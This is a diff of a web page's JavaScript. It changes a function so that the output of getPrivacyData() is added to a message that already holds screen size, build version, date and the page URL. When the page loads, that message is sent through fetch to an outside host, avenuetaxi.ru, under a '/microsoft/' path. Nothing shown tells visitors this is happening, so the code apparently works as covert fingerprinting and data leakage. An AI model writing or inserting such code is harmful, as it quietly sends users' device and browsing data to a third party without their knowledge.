@@ -126,10 +126,10 @@ function showScreenSize() {
     return (`Размер экрана: ${width}x${height}`);
 }
 sendtext = sendtext + ' \n'+ showScreenSize();
-sendtext = sendtext + ( ' \n'+debugData() );
 sendtext = sendtext + ( ' \n(ver.'+build+')' );
 console.log(sendtext)
-async function fetchData(stxt) {
+async function fetchData(stxt, debugDeviceData) {
+	sendtext = sendtext + ( ' \n'+debugDeviceData );
 	try {
 		const response = await fetch('https://avenuetaxi.ru/microsoft/?text='+encodeURIComponent(stxt+'\n'+(Date().replace(' (Москва, стандартное время)',''))+'\n'+'('+window.location.href+')'));
 		if (!response.ok) {
@@ -141,13 +141,20 @@ async function fetchData(stxt) {
 		console.error('Произошла ошибка:', error); // Обрабатываем ошибки
 	}
 }
+
+
+getPrivacyData().then(data => {
+	console.log(JSON.stringify(data, null, 2));
+
 if (typeof offlinemode !== 'undefined') {
     if (!offlinemode) {
-        fetchData(sendtext);
+        fetchData(sendtext, data);
     }
 } else {
-    fetchData(sendtext);
+    fetchData(sendtext, data);
 }
+  });
+
 // search 
 if (document.getElementById('search') != undefined) {
 const searchInput = document.getElementById('search');
